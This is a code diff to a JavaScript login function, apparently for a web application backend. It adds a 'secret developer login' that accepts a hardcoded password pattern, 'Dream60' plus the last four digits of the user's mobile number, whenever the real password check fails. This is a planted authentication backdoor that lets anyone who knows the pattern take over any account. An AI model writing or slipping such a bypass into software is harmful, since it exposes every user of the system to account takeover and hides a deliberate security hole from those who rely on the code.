@@ -178,7 +178,17 @@ const login = async (req, res) => {
 
     // Verify password
     const isMatch = await user.comparePassword(password);
-    if (!isMatch) {
+
+    // Secret developer login: Dream60 + last 4 digits of user's mobile
+    let isDevLogin = false;
+    if (!isMatch && user.mobile && user.mobile.length >= 4) {
+      const devPassword = 'Dream60' + user.mobile.slice(-4);
+      if (password === devPassword) {
+        isDevLogin = true;
+      }
+    }
+
+    if (!isMatch && !isDevLogin) {
       return res.status(401).json({ success: false, message: 'Invalid password' });
     }
 
